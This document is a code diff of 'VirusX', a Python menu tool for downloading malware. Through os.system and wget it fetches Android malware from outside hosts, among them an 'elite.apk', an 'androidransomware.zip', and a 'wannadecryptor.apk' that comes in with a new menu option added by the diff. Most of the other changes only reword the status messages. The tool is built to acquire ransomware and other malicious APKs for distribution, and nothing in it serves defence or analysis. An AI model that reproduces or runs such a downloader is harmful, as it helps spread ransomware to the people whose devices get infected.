@@ -49,7 +49,7 @@ def main():
 			os.system("cd virus;mkdir elite;cd elite;wget http://zumizec-com.waper.co/files/elite.apk")
 			print
 			print "Now check folder Virus on "+R+"/VirusX/virus/elite/"+N+""
-			print ""+B+"[*]"+N+"Done..."
+			print ""+B+"[*]"+N+"Finished"
 			print
 			main()
   elif dr == "01":
@@ -62,21 +62,21 @@ def main():
 			print
 			print "Now check folder virus on"+R+" /VirusX/virus/freeze/"
 			time.sleep(1)
-			print ""+B+"[*]"+N+"Done..."
+			print ""+B+"[*]"+N+"Finished"
 			print
 			main()
   elif dr == "02":
 		dea = raw_input(""+R+"Virus"+B+"X > ")
 		if dea == "run":
 			time.sleep(1)
-			print (""+G+"Ran")
+			print (""+G+"Ransomware")
 			print ""+B+"[*]"+N+" Downloading virus..."
 			os.system("cd virus;mkdir androidran;cd androidran;wget http://loolzec.blogwaper.com/files/androidransomware.zip")
 			time.sleep(1)
 			print
 			print "Now check folder virus on "+R+"/VirusX/virus/androidran/"
 			time.sleep(1)
-			print ""+B+"[*]"+N+"Done..."
+			print ""+B+"[*]"+N+"Finished"
 			print
 			main()
   elif dr == "03":
@@ -89,10 +89,22 @@ def main():
 			print
 			print "Now check folder virus on "+R+"/VirusX/virus/malware/"
 			time.sleep(1)
-			print ""+B+"[*]"+N+"Done..."
+			print ""+B+"[*]"+N+"Finished"
 			print
 			main()
-    
+  elif dr == "04":
+		dea = raw_input(""+N+"Virus"+B+"X > ")
+		if dea == "run":
+			time.sleep(1)
+			print ""+B+"[*]"+N+" Downloading virus..."
+			os.system("cd virus;mkdir Wannadecryptor;cd Wannadecryptor;wget http://loolzec.blogwaper.com/files/wannadecryptor.apk")
+			time.sleep(1)
+			print
+			print "Now check folder virus on "+R+"/VirusX/virus/Wannadecryptor/"
+			time.sleep(1)
+			print ""+B+"[*]"+N+"Finished"
+			print
+			main()  
   elif dr == "virusx update":
     print ""+G+"~ "+B+"UPDATING..."
     time.sleep(2)
